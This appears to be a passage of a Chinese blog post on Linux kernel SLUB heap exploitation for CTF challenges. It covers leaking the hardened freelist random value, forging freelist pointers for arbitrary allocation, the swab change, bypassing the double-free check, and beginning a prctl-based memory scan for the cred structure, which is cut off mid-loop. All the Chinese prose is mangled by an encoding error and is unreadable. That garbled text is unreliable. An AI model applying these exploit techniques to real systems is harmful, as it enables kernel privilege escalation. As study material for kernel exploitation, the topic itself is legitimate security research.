<p>å¦å¤–kmalloc_caches[0]å¹¶ä¸æ˜¯ä¸€ä¸ªkmem_cacheç»“æ„çš„ï¼Œè€Œæ˜¯ä¸€ä¸ªå…¶ä»–ç±»å‹ï¼Œæš‚æ—¶ä¸çŸ¥é“ç”¨æ¥å¹²å•¥ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161524450.png" alt="image-20220116152404345"></p>
<p>é‚£ä¹ˆå›åˆ°æ­£é¢˜ï¼Œå…ˆå¯»æ‰¾ä¸‹randomï¼Œè¿™ä¸ªå°±æ˜¯0x10å¤§å°çš„kmem_cacheä¸­ä¿å­˜çš„randomå€¼äº†ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161524429.png" alt="image-20220116152450367"></p>
<p>é‚£ä¹ˆæˆ‘ä»¬å¾—åˆ°randomå€¼å°±å¯ä»¥ç®—å‡ºä¸‹ä¸€ä¸ªchunkåœ¨å“ªé‡Œäº†</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161527850.png" alt="image-20220116152702584"></p>
<p>ä½†æ˜¯é€šå¸¸æ„ä¹‰ä¸Šå¦‚æœå¼€å¯äº†è¿™ä¸ªä¿æŠ¤ï¼Œæˆ‘ä»¬æ˜¯å¾—ä¸åˆ°å †åœ°å€çš„ï¼Œæœ€å¤šå¾—åˆ°ä¿æŠ¤ä¹‹åçš„fdçš„å€¼ï¼Œæ²¡åŠæ³•ç®—å‡ºæ¥randomçš„å€¼ï¼Œä½†æ˜¯ç”±äºæ˜¯å¼‚æˆ–äº†å½“å‰å †åœ°å€ptrå’Œå †åœ°å€+size(ptr_addr)ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯¹sizeåšæ–‡ç« ï¼Œè¿™æ ·å¯ä»¥æ‰¾å‡ºä¸€äº›è§„å¾‹ã€‚</p>
<p>å‚è€ƒ<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/259280#h3-15" >slubå †æº¢å‡ºçš„åˆ©ç”¨ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h5 id="ğŸ”ºæ³¨ï¼š-1"   >
          <a href="#ğŸ”ºæ³¨ï¼š-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºæ³¨ï¼š-1" class="headerlink" title="ğŸ”ºæ³¨ï¼š"></a>ğŸ”ºæ³¨ï¼š</h5>
      <p>åœ¨è¯¥å†…æ ¸ä¸‹çš„åŒä¸€ä¸ªsizeçš„kmem_cacheçš„randomå€¼ä¸ç®¡å¯åŠ¨å¤šå°‘æ¬¡éƒ½æ˜¯å›ºå®šçš„ï¼Œæ— è®ºæœ‰æ²¡æœ‰å¼€å¯KASLRã€‚ï¼ˆè‡³å°‘æˆ‘åœ¨æœ¬åœ°æµ‹çš„æ—¶å€™æ˜¯å¦‚æ­¤çš„ï¼‰</p>

        <h6 id="æœªå¼€å¯KASLR"   >
          <a href="#æœªå¼€å¯KASLR" class="heading-link"><i class="fas fa-link"></i></a><a href="#æœªå¼€å¯KASLR" class="headerlink" title="æœªå¼€å¯KASLR"></a>æœªå¼€å¯KASLR</h6>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201181243725.png" alt="image-20220118124309671"></p>

        <h6 id="å¼€å¯KASLR"   >
          <a href="#å¼€å¯KASLR" class="heading-link"><i class="fas fa-link"></i></a><a href="#å¼€å¯KASLR" class="headerlink" title="å¼€å¯KASLR"></a>å¼€å¯KASLR</h6>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201181243644.png" alt="image-20220118124331545"></p>
<p>å¯ä»¥çœ‹åˆ°éƒ½æ˜¯ä¸€è‡´çš„ã€‚</p>
<p>ä½†æ˜¯æ”¾åˆ°é¢˜ç›®ä¸­å°±ä¸å¤ªç¡®å®šäº†ï¼Œå°±æ˜¯å°†é¢˜ç›®åœ¨æœ¬åœ°è¿è¡Œæµ‹å‡ºæ¥çš„randomå€¼å’Œé¢˜ç›®åœ¨è¿œç¨‹è¿è¡Œæµ‹å‡ºæ¥çš„randomå€¼æ˜¯ä¸æ˜¯ä¹Ÿæ˜¯ä¸€æ ·çš„å‘¢ï¼Œä¹‹å‰çš„è¥¿æ¹–çš„easy_kernelé¢˜ä¸­è²Œä¼¼æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯æˆ‘å¹¶æ²¡æœ‰å®é™…æµ‹è¯•ï¼Œå› ä¸ºè¿˜æ²¡ç¢°åˆ°..ä¸‹å›æ¢ä¸ªæœºå™¨æµ‹è¯•ä¸‹ã€‚æˆ–è€…è¯´å’Œqemuè¿˜æ˜¯ç¯å¢ƒcpuéƒ½æœ‰å…³ç³»å—ï¼ŒæœŸå¾…å¤§ä½¬å›ç­”ã€‚</p>
<p>è€Œä¸”åœ¨åé¢çš„<strong>æ–°ç‰ˆçš„HARDENED</strong>ä¸­ä¹Ÿæœ‰æåˆ°ï¼ŒåŠ å…¥swabè¿ç®—ä¹‹åï¼Œè²Œä¼¼ä¼šå¯¹randomå€¼å†åšä¸€ä¸ªä½2ä¸ªå­—èŠ‚çš„å¤„ç†ï¼Œè¿™ä¸ªæ˜¯æ€ä¹ˆå¤„ç†çš„å‘¢ï¼Œè¿˜æ˜¯æœ‰ç‚¹ä¸å¤ªæ‡‚ã€‚</p>

        <h5 id="â‘ 0x8ä¸ºä¾‹"   >
          <a href="#â‘ 0x8ä¸ºä¾‹" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ 0x8ä¸ºä¾‹" class="headerlink" title="â‘ 0x8ä¸ºä¾‹"></a>â‘ 0x8ä¸ºä¾‹</h5>
      <p>0x10å¯¹é½çš„å †å—å…¶fdå‡ä¸€æ ·ï¼Œå–å…¶fdç›´æ¥å¼‚æˆ–0x8å³å¯å¾—åˆ°kmalloc-8çš„randomå€¼</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161703956.png" alt="image-20220116170303600"></p>
<p>åŸå› å¦‚ä¸‹ï¼Œ0x10å¯¹é½çš„å †å—å¼‚æˆ–å…¶å€¼+0x8å¹¶ä¸ä¼šé€ æˆè¿›ä½ï¼Œæ‰€ä»¥å¼‚æˆ–å¾—åˆ°çš„å€¼éƒ½æ˜¯ä¸€æ ·çš„</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161707520.png" alt="image-20220116170714710"></p>

        <h5 id="â‘¡0x10ï¼Œ0x20ï¼Œ0x30ç­‰ç­‰"   >
          <a href="#â‘¡0x10ï¼Œ0x20ï¼Œ0x30ç­‰ç­‰" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡0x10ï¼Œ0x20ï¼Œ0x30ç­‰ç­‰" class="headerlink" title="â‘¡0x10ï¼Œ0x20ï¼Œ0x30ç­‰ç­‰"></a>â‘¡0x10ï¼Œ0x20ï¼Œ0x30ç­‰ç­‰</h5>
      <p>è¿™ç§ç±»å‹çš„å…¶fdå’Œrandomå€¼ä¸€èˆ¬å·®åŠä¸ªå­—èŠ‚ï¼Œå¤§ä¸äº†ç›´æ¥çˆ†ç ´ï¼Œ1/16çš„æ¦‚ç‡</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161750717.png" alt="image-20220116175038466"></p>
<p>å¹¶ä¸”è§‚å¯Ÿå¯ä»¥å‘ç°ï¼Œåœ¨0x10çš„æƒ…å†µä¸‹ä¹Ÿä¼šæœ‰é‡å¤çš„éƒ¨åˆ†ï¼ŒåŒæ ·çš„ï¼Œè¯¥é‡å¤çš„éƒ¨åˆ†å¼‚æˆ–0x10ä¹Ÿä¼šæ˜¯randomå€¼</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161752331.png" alt="image-20220116175228263"></p>
<p>å…·ä½“çš„è¿˜æ˜¯è‡ªå·±æ‘¸ç´¢æˆ–è€…çœ‹ä¸€åªç‹—å¸ˆå‚…çš„ï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/259280#h3-16" >slubå †æº¢å‡ºçš„åˆ©ç”¨ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h5 id="æ³„éœ²random"   >
          <a href="#æ³„éœ²random" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ³„éœ²random" class="headerlink" title="æ³„éœ²random"></a>æ³„éœ²random</h5>
      <p>ä»¥ä¸‹æ³„éœ²Randomæ ·ä¾‹ä¹Ÿæ˜¯å‚ç…§ä¸€åªç‹—å¸ˆå‚…çš„</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Add(<span class="number">0</span>, <span class="number">0x100</span>);</span><br><span class="line">Add(<span class="number">1</span>, <span class="number">0x100</span>);</span><br><span class="line">Add(<span class="number">2</span>, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">Show(<span class="number">0</span>, &amp;FD1, <span class="number">8</span>);</span><br><span class="line">Show(<span class="number">1</span>, &amp;FD2, <span class="number">8</span>);</span><br><span class="line">Show(<span class="number">2</span>, &amp;FD3, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> random;</span><br><span class="line"><span class="keyword">if</span>(FD1==FD3)</span><br><span class="line">    random = FD1^<span class="number">0x100</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    random = FD2^<span class="number">0x100</span>;</span><br></pre></td></tr></table></div></figure>


        <h5 id="è·å¾—å †åœ°å€ä»»æ„å†™"   >
          <a href="#è·å¾—å †åœ°å€ä»»æ„å†™" class="heading-link"><i class="fas fa-link"></i></a><a href="#è·å¾—å †åœ°å€ä»»æ„å†™" class="headerlink" title="è·å¾—å †åœ°å€ä»»æ„å†™"></a>è·å¾—å †åœ°å€ä»»æ„å†™</h5>
      <p>ä½†æ˜¯è·å¾—å †åœ°å€ä¸å¤ªå¥½æ•´ï¼Œéœ€è¦æ‰¾åˆ°freelistçš„æœ€åä¸€ä¸ªå †å—last_chunkï¼Œç„¶åå…¶fdå¼‚æˆ–randomå³å¯å¾—åˆ°è¯¥å †å—çš„åœ°å€ï¼Œè·å¾—å †å—åœ°å€åï¼Œç›´æ¥é‡Šæ”¾è¯¥å †å—last_chunkï¼Œç„¶åé€šè¿‡ä¹‹å‰ä¸€ä¸ªå †å—pre_chunkæº¢å‡ºæˆ–è€…UAFï¼ŒæŒ‰ç…§å¼‚æˆ–è§„åˆ™ä¿®æ”¹last_chunkçš„fdï¼Œå°±èƒ½å®ç°ä»»æ„ç”³è¯·äº†ã€‚</p>
<p>ä»¥8192å¤§å°ä¸ºä¾‹ï¼Œç”³è¯·åˆ°æœ€åä¸€ä¸ªchunkæ—¶é‡Šæ”¾ï¼Œç„¶åå†ç”³è¯·å°±èƒ½ç”³è¯·å›æ¥äº†ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161815160.png" alt="image-20220116181547997"></p>
<p>æ³¨æ„è·å–å †åœ°å€çš„æ—¶å€™ï¼Œç”±äºä¸åŒsizeçš„kmem_cacheçš„æœ€å¤§freelistæ•°é‡å·®å¼‚è¾ƒå¤§ï¼Œsizeè¶Šå¤§çš„å…¶freelisté“¾è¡¨ä¸ªæ•°è¶Šå°‘ï¼Œè¶Šå®¹æ˜“ç”³è¯·åˆ°æœ€åä¸€ä¸ªã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161744323.png" alt="image-20220116174436185"></p>

        <h4 id="2-HARDENEDæ–°ç‰ˆæ”¹åŠ¨"   >
          <a href="#2-HARDENEDæ–°ç‰ˆæ”¹åŠ¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-HARDENEDæ–°ç‰ˆæ”¹åŠ¨" class="headerlink" title="(2)HARDENEDæ–°ç‰ˆæ”¹åŠ¨"></a>(2)HARDENEDæ–°ç‰ˆæ”¹åŠ¨</h4>
      
        <h5 id="kasan-reset-tag"   >
          <a href="#kasan-reset-tag" class="heading-link"><i class="fas fa-link"></i></a><a href="#kasan-reset-tag" class="headerlink" title="kasan_reset_tag"></a>kasan_reset_tag</h5>
      <p>ä»v5.0å¼€å§‹ï¼ŒåŠ äº†ä¸€ä¸ªæ–°çš„ä¸œè¥¿</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kasan_reset_tag((<span class="keyword">void</span> *)ptr_addr));</span><br></pre></td></tr></table></div></figure>

<p>è¿™ä¸ªä¸çŸ¥é“ç”¨æ¥å¹²å•¥çš„ï¼Œæœ‰ç‚¹è’™åœˆ</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//linux/kasan.h</span><br><span class="line">static inline void *kasan_reset_tag(const void *addr)</span><br><span class="line">&#123;</span><br><span class="line">	return (void *)addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h5 id="swab"   >
          <a href="#swab" class="heading-link"><i class="fas fa-link"></i></a><a href="#swab" class="headerlink" title="swab"></a>swab</h5>
      <p>ä»v5.6.4å¼€å§‹ï¼ŒåˆåŠ äº†ä¸€ä¸ªè¿ç®—</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">swab(kasan_reset_tag((<span class="keyword">void</span> *)ptr_addr)));</span><br></pre></td></tr></table></div></figure>

<p>æœ¬è´¨ä¸Šæ˜¯å¤§å°ç«¯äº’æ¢ï¼Œæ¯”å¦‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> before = <span class="number">0xaabbccdd</span>;</span><br><span class="line"><span class="keyword">int</span> after = swab(before);</span><br><span class="line">after == <span class="number">0xddccbbaa</span>;</span><br></pre></td></tr></table></div></figure>

<p>è¿™ä¸ªç›´æ¥è§£ï¼Œå‚ç…§å“ªä¸ªå¸ˆå‚…çš„æ¥ç€ï¼Œå¿˜è®°äº†â€¦..</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __u64 u_int64_t</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> swab64(x) ((__u64)((((__u64)(x) &amp; (__u64)0x00000000000000ffULL) &lt;&lt; 56) | \</span></span><br><span class="line"><span class="meta">        (((__u64)(x) &amp; (__u64)0x000000000000ff00ULL) &lt;&lt; 40) | \</span></span><br><span class="line"><span class="meta">        (((__u64)(x) &amp; (__u64)0x0000000000ff0000ULL) &lt;&lt; 24) | \</span></span><br><span class="line"><span class="meta">        (((__u64)(x) &amp; (__u64)0x00000000ff000000ULL) &lt;&lt; 8)  | \</span></span><br><span class="line"><span class="meta">        (((__u64)(x) &amp; (__u64)0x000000ff00000000ULL) &gt;&gt; 8)  | \</span></span><br><span class="line"><span class="meta">        (((__u64)(x) &amp; (__u64)0x0000ff0000000000ULL) &gt;&gt; 24) | \</span></span><br><span class="line"><span class="meta">        (((__u64)(x) &amp; (__u64)0x00ff000000000000ULL) &gt;&gt; 40) | \</span></span><br><span class="line"><span class="meta">        (((__u64)(x) &amp; (__u64)0xff00000000000000ULL) &gt;&gt; 56)))</span></span><br></pre></td></tr></table></div></figure>

<p>ç„¶ååˆä¸çŸ¥é“ä»å“ªä¸ªç‰ˆæœ¬å¼€å§‹ï¼ŒFDçš„å­˜æ”¾ä½ç½®å‘ç”Ÿæ”¹å˜ï¼Œæ”¾åœ¨äº†chunk_addr+(size/2)çš„ä½ç½®ä¸Šï¼Œä»¥0x80å¤§å°çš„chunkä¸ºä¾‹å­(åæ­£v5.0æ²¡æœ‰ï¼Œv5.7æœ‰)</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201171050239.png" alt="image-20220117105059115"></p>
<p>æ­¤å¤–è®¡ç®—æ–¹å¼ä¹Ÿæœ‰ç‚¹å˜åŒ–ï¼Œptr_addrä¸å†æ˜¯å½“å‰chunkçš„åœ°å€ï¼Œè€Œæ˜¯FDçš„åœ°å€ï¼ŒåŒæ—¶è¿˜æ˜¯ä¼šä¸ä¸Šé¢çš„è¿ç®—åšä¸€ä¸ªç®€å•çš„åˆå¹¶:</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD_addr == chunk_addr + size/<span class="number">2</span></span><br><span class="line">FD_value == random ^ swab(FD_addr) ^ next_chunk_addr</span><br></pre></td></tr></table></div></figure>

<p>æ‰€ä»¥å½“æˆ‘ä»¬æœ¬åœ°æŠŠrandomå€¼æµ‹å‡ºæ¥ä¹‹åï¼Œå†ä¾æ®freelistçš„æœ€åä¸€ä¸ªç›´æ¥æ”¹next_addrç„¶åå¥—å…¥ä¸Šè¿°å…¬å¼ï¼Œè·å¾—FDå€¼ï¼Œå°†FDå€¼å†™å…¥å³å¯å®Œæˆä¸Šè¿°ä»»æ„å †å—ç”³è¯·ã€‚ï¼ˆä½†æ˜¯è¿œç¨‹è¿˜æ²¡æœ‰è¯•è¿‡ï¼Œæƒ³æ¥ä¾æ®æœ€è¿‘çš„easy_kernelä¸­æµ‹å‡ºæ¥çš„æƒ…å†µåº”è¯¥æ˜¯randomå€¼ä¹Ÿæ˜¯ä¸å˜çš„ï¼‰</p>
<p>åŒæ ·çš„å½“ä½äºfreelistçš„æœ€åä¸€ä¸ªchunkæ—¶ï¼Œnext_chunk_addr = 0ï¼Œä¸Šè¿°å…¬å¼å°±å˜æˆå¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD_addr == chunk_addr + size/<span class="number">2</span></span><br><span class="line">FD_value == random ^ swab(FD_addr)</span><br></pre></td></tr></table></div></figure>

<p>è¿›è€Œå¯ä»¥æµ‹å‡ºFD_addrï¼Œå¾—åˆ°chunkçš„åœ°å€ã€‚å½“ç„¶ï¼Œå‰ææ˜¯å»ºç«‹åœ¨è¿œç¨‹çš„randomå€¼ä¸ä¼šå‘ç”Ÿæ”¹å˜ã€‚</p>
<p>å¦‚æœè¿œç¨‹çš„randomå€¼ä¼šå‘ç”Ÿæ”¹å˜çš„è¯ï¼Œé‚£ä¹ˆç›´æ¥å°†å½“å‰FD_valueå¼‚æˆ–éœ€è¦åŠ«æŒçš„fake_chunk_addrï¼Œé‚£ä¹ˆä¸€ç›´å°†freelistç”³è¯·å®Œï¼Œä¹‹åå†æ¥ç€ç”³è¯·å°±èƒ½å¾—åˆ°fake_chunk_addrã€‚è¿™ç§æƒ…å†µæˆ‘ä»¬å¯ä»¥å€ŸåŠ©è¿ç»­çš„ä¸¤ä¸ªFD_valueä¸­é—´4ä¸ªå­—èŠ‚æ˜¯å¦å‘ç”Ÿæ”¹å˜æ¥è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœæ”¹å˜äº†ï¼Œé‚£ä¹ˆä»£è¡¨freelistå³å°†ç»“æŸï¼Œè¿™æ—¶å€™å°±å¯ä»¥è¿›è¡Œä¿®æ”¹äº†ã€‚ä¸è¿‡ä¿®æ”¹ä¹‹åï¼Œè¯¥sizeçš„<code>kmem_cache</code>çš„freelisté“¾è¡¨å°±ä¼šæŸåï¼Œè¦ä¹ˆé‡æ–°ä¿®å¤ï¼Œè¦ä¹ˆå°±ç”³è¯·å…¶ä»–sizeçš„<code>kmem_cache</code>ã€‚</p>
<p>ä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯ï¼Œå¦‚æœå¼€äº†ä¸‹é¢çš„<code>RANDOM</code>ä¿æŠ¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬æµ‹å‡ºæ¥çš„randomå€¼å…¶å®å°±ä¸ä¸€å®šå‡†ç¡®äº†ï¼Œå› ä¸ºfreelistä¸­çš„chunkåœ°å€ä¸æ˜¯è¿ç»­çš„ï¼Œæˆ‘ä»¬ç”¨è¿ç»­çš„åœ°å€æ¥æµ‹åŠ¿å¿…å¯¼è‡´æµ‹å‡ºæ¥çš„randomå€¼çš„ä½2ä¸ªå­—èŠ‚ä¸åŒï¼Œè¿™æ—¶å€™å°±éœ€è¦ç”³è¯·åˆ°freelistçš„æœ€åä¸€ä¸ªchunkï¼Œå–å¾—å…¶FDå€¼çš„ä½2ä¸ªå­—èŠ‚å’Œæˆ‘ä»¬ä¹‹å‰æµ‹å‡ºæ¥çš„randomä¸€åˆå¹¶å°±æ˜¯æœ€ç»ˆçš„randomå€¼äº†ã€‚ä¸è¿‡è¿™ä¸ªæ€ä¹ˆåˆ¤æ–­æ˜¯freelistçš„æœ€åä¸€ä¸ªchunkä¹Ÿæœ‰ç‚¹é—®é¢˜â€¦</p>

        <h5 id="double-free"   >
          <a href="#double-free" class="heading-link"><i class="fas fa-link"></i></a><a href="#double-free" class="headerlink" title="double_free"></a>double_free</h5>
      <p>åœ¨å¼€å¯äº†HARDENEDè¿™ç§æƒ…å†µä¸‹ï¼Œå¯¹äºFDæŒ‡é’ˆä¼šæ·»åŠ ä¸€ä¸ªæ£€æµ‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//mm/slub.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">set_freepointer</span><span class="params">(struct kmem_cache *s, <span class="keyword">void</span> *object, <span class="keyword">void</span> *fp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> freeptr_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)object + s-&gt;offset;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	BUG_ON(object == fp); <span class="comment">/* naive detection of double free or corruption */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	*(<span class="keyword">void</span> **)freeptr_addr = freelist_ptr(s, fp, freeptr_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>æ£€æµ‹double_freeï¼Œå…¶å®å°±ç›¸å½“äºæ˜¯fastbinä¸­çš„double_freeæ£€æµ‹ï¼Œæ£€æµ‹freelistä¸­çš„ç¬¬ä¸€ä¸ªå’Œå³å°†æ”¾è¿›å…¥freelistä¸­çš„chunkæ˜¯å¦ç›¸ç­‰ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203082351317.png" alt="image-20220308235157003"></p>
<p>æ‰€ä»¥åŒç†å¯å¾—ï¼Œä¹Ÿå¯ä»¥è¯´å¦‚ä¸‹ï¼Œåœ¨ä¸­é—´åŠ å…¥ä¸€ä¸ªchunkçš„freeå³å¯ç»•è¿‡</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free chunk1</span><br><span class="line">free chunk2</span><br><span class="line">free chunk1</span><br></pre></td></tr></table></div></figure>

<p>ä½†æ˜¯åœ¨å†…æ ¸ç¯å¢ƒä¸‹ï¼Œå•¥æ—¶å€™éƒ½å¯èƒ½ç¢°åˆ°ç”³è¯·chunkï¼Œæ‰€ä»¥æœ‰æ—¶å€™å¯èƒ½å†ç”³è¯·çš„æ—¶å€™ä¸èƒ½æˆåŠŸç”³è¯·åˆ°chunk1-&gt;chunk2-&gt;chunk1çš„é¡ºåº</p>
<p>è¿™æ—¶å€™å¦‚æœæœ€å¥½è¿˜æ˜¯ç»‘å®šåˆ°ä¸€ä¸ªCPUä¸Š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ç»‘å®šåˆ°ä¸€ä¸ªcpuä¸Š</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> cpu_mask = <span class="number">0x01</span>;</span><br><span class="line">sched_setaffinity(<span class="number">0</span>, <span class="number">1</span>, &amp;cpu_mask);</span><br></pre></td></tr></table></div></figure>




        <h4 id="3-RANDOMä¿æŠ¤"   >
          <a href="#3-RANDOMä¿æŠ¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-RANDOMä¿æŠ¤" class="headerlink" title="(3)RANDOMä¿æŠ¤"></a>(3)RANDOMä¿æŠ¤</h4>
      <p>åœ¨v4.7åŠä¹‹åå­˜åœ¨ï¼Œç¼–è¯‘å†…æ ¸æ—¶åŠ å…¥<code>CONFIG_SLAB_FREELIST_RANDOM=y</code>é€‰é¡¹ï¼Œä¼šå¯ç”¨<code>Fisher-Yates</code>éšæœºæ’åˆ—ç®—æ³•æ‰“ä¹±freelistçš„é¡ºåº</p>
<p>è¿™ä¸ªæƒ…å†µä¸‹æ¯æ¬¡æ›´æ–°freelistçš„æ—¶å€™ï¼Œä¼šæ‰“ä¹±freelistä¸­ç©ºé—²çš„chunkï¼Œé€ æˆæ— æ³•ç®€å•ç”³è¯·åˆ°æŒ‡å®šçš„chunkï¼Œä¸è¿‡æˆ‘ä»¬å¯ä»¥ä¿®æ”¹FDä¹‹åï¼Œå¤šæ¬¡ç”³è¯·ï¼Œä¹Ÿå¯ä»¥ç”³è¯·åˆ°ä¿®æ”¹ä¹‹åçš„chunkã€‚</p>
<p>ä¹Ÿæ˜¯å‚è€ƒ<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://rtfingc.github.io/slub-freelist-hardened" >Slub Freelist Hardened (rtfingc.github.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="å€ŸåŠ©prctlå‡½æ•°å¯»æ‰¾credåœ°å€"   >
          <a href="#å€ŸåŠ©prctlå‡½æ•°å¯»æ‰¾credåœ°å€" class="heading-link"><i class="fas fa-link"></i></a><a href="#å€ŸåŠ©prctlå‡½æ•°å¯»æ‰¾credåœ°å€" class="headerlink" title="å€ŸåŠ©prctlå‡½æ•°å¯»æ‰¾credåœ°å€"></a>å€ŸåŠ©prctlå‡½æ•°å¯»æ‰¾credåœ°å€</h3>
      <p>ğŸ”ºæ³¨ï¼šéœ€è¦å­˜åœ¨ä»»æ„è¯»</p>
<p>prctlå‡½æ•°çš„PR_SET_NAMEåŠŸèƒ½å¯ä»¥è®¾ç½®task_structç»“æ„ä½“ä¸­çš„comm[TASK_COMM_LEN]æˆå‘˜ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> target[<span class="number">16</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(target,<span class="string">&quot;tryToFindPIG007&quot;</span>);</span><br><span class="line">prctl(PR_SET_NAME,target);</span><br></pre></td></tr></table></div></figure>

<p>ç„¶åå†…å­˜æœç´¢å®šä½</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//search target chr</span></span><br><span class="line"><span class="keyword">char</span> *buf = (<span class="keyword">char</span> *)<span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x1000</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[+] we can read and write any memory&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(;addr&lt;<span class="number">0xffffc80000000000</span>;addr+=<span class="number">0x1000</span>)&#123;</span><br><span class="line">    arbitrary_read(devFD,<span class="number">0x1000</span>,buf,addr);</span><br><span class="line">    result=memmem(buf,<span class="number">0x1000</span>,target,<span class="number">16</span>);</span><br><span class="line">    